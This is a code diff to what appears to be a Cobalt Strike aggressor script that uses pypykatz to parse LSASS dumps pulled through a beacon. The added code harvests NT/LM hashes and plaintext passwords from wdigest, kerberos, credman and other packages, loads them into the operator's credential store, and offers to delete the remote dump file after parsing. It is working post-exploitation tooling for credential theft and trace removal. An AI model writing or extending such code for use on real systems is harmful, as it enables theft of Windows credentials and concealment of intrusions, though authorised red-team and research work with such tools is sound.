@@ -168,7 +168,21 @@ class BaconFileReader:
 def beacon_top_callback(bids):
 	engine.debug('')
 
-def parse_lsass(bid, filepath, boffilepath, chunksize, packages = ['all'], outputs = ['text']):
+def pwconv(x):
+	if x is None:
+		return x
+	if len(x) == 0 or x is None:
+		return None
+	if isinstance(x, str) and x == '' or x.lower() == 'none':
+		return None
+	if isinstance(x, bytes):
+		return x.hex()
+	
+	return x
+
+def parse_lsass(bid, filepath, boffilepath, chunksize, packages = ['all'], outputs = ['text'], to_delete = False, add_creds = True):
+	
+
 	engine.message('parse_lsass invoked')
 	engine.message('bid %s' % bid)
 	engine.message('filepath %s' % filepath)
@@ -194,6 +208,30 @@ def parse_lsass(bid, filepath, boffilepath, chunksize, packages = ['all'], outpu
 	if 'grep' in outputs:
 		engine.message(mimi.to_grep())
 		aggressor.blog(bid, mimi.to_grep())
+	
+	if to_delete is True:
+		engine.call('fdelete', [bid, boffilepath, filepath, 1])
+
+	if add_creds is True:
+		host = str(bid)
+		for luid in mimi.logon_sessions:
+			res = mimi.logon_sessions[luid].to_dict()
+			for msv in res['msv_creds']:
+				engine.message(repr(msv))
+				if pwconv(msv['NThash']) is not None:
+					source = '[AGGROKATZ][%s][%s] LSASS dump %s' % ('msv', 'NT', filepath)
+					aggressor.credential_add(str(msv['username']), pwconv(msv['NThash']), str(msv['domainname']), source, host)
+				if pwconv(msv['LMHash']) is not None:
+					source = '[AGGROKATZ][%s][%s] LSASS dump %s' % ('msv', 'LM',filepath)
+					aggressor.credential_add(str(msv['username']), pwconv(msv['LMHash']), str(msv['domainname']), source, host)
+
+			for pkgt in ['wdigest_creds','ssp_creds','livessp_creds','kerberos_creds','credman_creds','tspkg_creds']:
+				for pkg in res[pkgt]:
+					if pwconv(pkg['password']) is not None:
+						source = '[AGGROKATZ][%s] LSASS dump %s' % (pkgt, filepath)
+						aggressor.credential_add(str(pkg['username']),  pwconv(pkg['password']), str(pkg['domainname']), source, host)
+	
+	
 
 def	parse_registry(bid, boffilepath, system_filepath, sam_filepath = None, security_filepath = None, software_filepath = None, chunksize = 10240, outputs = ['text']):
 	engine.message('parse_registry invoked')
@@ -268,7 +306,13 @@ def dialog_callback_lsass(dialog, button_name, values_dict):
 		aggressor.show_error("No output format(s) selected! LSASS parsing will not start!")
 		return
 
-	parse_lsass(bid, filepath, boffilepath, chunksize, packages = packages, outputs = outputs)
+	to_delete = True if values_dict['delete'] == 'true' else False
+	add_creds = True if values_dict['credadd'] == 'true' else False
+
+	engine.message('to_delete %s' % repr(to_delete))
+	engine.message('add_creds %s' % repr(add_creds))
+
+	parse_lsass(bid, filepath, boffilepath, chunksize, packages = packages, outputs = outputs, to_delete = to_delete, add_creds = add_creds)
 
 
 
@@ -322,6 +366,8 @@ def render_dialog_pypykatz_lsass(bid):
 		'json' : "false",
 		'text' : "false",
 		'grep' : "true",
+		'credadd' : "true",
+		'delete' : "false",
 		'bid' : bid,
 	}
 
@@ -341,6 +387,8 @@ def render_dialog_pypykatz_lsass(bid):
 	aggressor.drow_checkbox(dialog, "json", "Output to json", "")
 	aggressor.drow_checkbox(dialog, "text", "Output to text", "")
 	aggressor.drow_checkbox(dialog, "grep", "Output to grep", "")
+	aggressor.drow_checkbox(dialog, "credadd", "Populate the Credential tab (not really precise)", "")
+	aggressor.drow_checkbox(dialog, "delete", "Delete remote file after parsing", "")
 	aggressor.dbutton_action(dialog, "START")
 	aggressor.dialog_show(dialog)
 
